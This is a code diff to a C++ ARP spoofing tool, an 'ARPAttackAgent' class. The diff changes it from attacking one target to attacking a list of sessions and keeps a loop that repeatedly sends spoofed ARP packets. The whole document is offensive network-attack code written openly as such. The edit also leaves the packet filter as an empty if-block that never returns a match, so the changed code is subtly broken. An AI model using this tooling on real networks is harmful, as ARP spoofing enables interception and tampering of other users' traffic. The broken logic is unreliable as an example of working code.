@@ -7,20 +7,16 @@
 class ARPAttackAgent {
 private:
     char* netInterface;
-    uint8_t* targetIP;
+    std::pair<uint8_t*, uint8_t*>* sessionList;
 
     bool isBroadcast = false;
-    uint8_t* singleClient;
-    SendARPManager sendArpManager;
+    SendARPManager* sendArpManager;
 
     std::optional<ARPHeader*> processARPPacket(const uint8_t *packet) {
         auto *etherHeader = (EtherHeader *) packet;
         if (ntohs(etherHeader->type) == ETHER_TYPE_ARP) {
             auto *arpHeader = (ARPHeader *) (packet + sizeof(EtherHeader));
             if (arpHeader->op_code == ARP_OPCODE_REPLY) {
-                if (this->isBroadcast or this->singleClient == arpHeader->sender_ip) {
-                    return arpHeader;
-                } else return {};
             }
         }
         return {};
@@ -28,10 +24,14 @@ private:
 public:
     const static int UNLIMITED = 0;
 
-    ARPAttackAgent(char* netInterface, uint8_t* targetIP, std::optional<uint8_t*> senderIP):
-    netInterface(netInterface), targetIP(targetIP), sendArpManager(SendARPManager(netInterface)) {
-        if (!senderIP) this->isBroadcast = true;
-        else this->singleClient = senderIP.value();
+    ARPAttackAgent(char* netInterface, std::pair<uint8_t*, uint8_t*>* sessionList):
+    netInterface(netInterface) {
+        if (sessionList) this->sessionList = sessionList;
+        else {
+            this->sessionList = nullptr;
+            this->isBroadcast = true;
+        }
+        this->sendArpManager = new SendARPManager(netInterface);
     }
 
     void scanClients() {
@@ -48,7 +48,7 @@ public:
             auto arpHeader = this->processARPPacket(packet);
 
             if (arpHeader) {
-                if (this->sendArpManager.addARPTarget(arpHeader.value())) {
+                if (this->sendArpManager->addARPTarget(arpHeader.value())) {
                     std::cout << "INFO: Collected ARP sender: " << arpHeader.value()->sender_ip << std::endl;
                     go = false;
                 }
@@ -65,11 +65,10 @@ public:
         uint attackCount = 0;
         while (go) {
             std::cout << "[" << attackCount << "]" << " Send attack..." << std::endl;
-            this->sendArpManager.sendARPPacket();
+            this->sendArpManager->sendARPPacket();
             attackCount++;
             if (attackCount > maxAttack and maxAttack != 0) go = false;
         }
 
-        std::cout << "INFO: End ARP spoofing attack" << std::endl;
-    }
+        std::cout << "INFO: End ARP spoofing attack" << std::endl;}
 };
